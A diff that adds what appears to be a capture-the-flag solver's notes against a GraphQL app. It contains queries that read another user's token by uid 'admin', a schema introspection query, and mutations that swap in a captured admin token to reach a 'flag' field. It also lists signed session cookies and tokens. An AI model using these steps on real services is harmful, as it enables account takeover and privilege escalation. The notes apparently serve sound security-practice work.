@@ -1,0 +1,30 @@
+{"query":"query {\n    me {\n      uid\n      token\n      name\n      profile\n    }\n  }"}
+
+{"query":"query {\n    someone(uid: \"admin\") {\n      uid\n      token\n      name\n      profile\n    }\n  }"}
+
+{"query":"query {\n __schema { types {\n ... {\n name\nkind\ndescription\nfields {\n ... {\nname\ndescription\nargs {\n ... {\nname}\n}\n}\n}\n }\n\n }\n }\nme {\n __typename\nuid\n }\n__typename\n   }"}
+
+{"query":"mutation {\n    updateProfile(profile: \"Hello\", token: \"60682e840ba0019f4a26d884baf267395d13fb79f62e57d4ace986aba8ef718e\")\n  }"}
+
+{"query":"mutation {\n    updateToken(token: \"b86c05067d0c7119ae0f2a5fe290f0a8b4d263ab427c5d3be24ec51affcf443e\")\n  }"}
+
+
+
+
+{"query":"query {\n    flag\n  }"}
+
+eyJ1aWQiOiJob2dlaG9nZSJ9.Xskuog.vImu5b0iXyCmFRG6vfi7KTXBC2k
+eyJ1aWQiOiJmdWdhZnVnYSJ9.Xskkeg.5lCnhTnuTRbi-9-J6VDvCWn3Wsg
+eyJ1aWQiOiJob2dlaG9nZSJ9.XsktIQ.qkzVgs2gGnvI1aOcVikNg37V-2U
+
+eyJ1aWQiOiJob2dlaG9nZSJ9.XskyiQ.kxs4eYD47-FlnW0IYqQ4pQ_g30s
+
+eyJ1aWQiOiJob2dlaG9nZSJ9.Xsk4rw.CbJJzcxmBWhTBOdcBnDsiXIkXxI
+eyJ1aWQiOiJob2dlaG9nZSJ9.Xsk5Cw.t6IzFyuUNlJOaGPeZxAjKV7BYdE
+eyJ1aWQiOiJob2dlaG9nZSJ9.Xsk5kA.eDxbFwyt6mpoT0_p-mPL-oXWWkc
+
+
+1cfef5aef704cac108cf61eaff9d7b8b1646de922d32c1327359625a6c6ab22c
+
+admin token:
+b86c05067d0c7119ae0f2a5fe290f0a8b4d263ab427c5d3be24ec51affcf443e
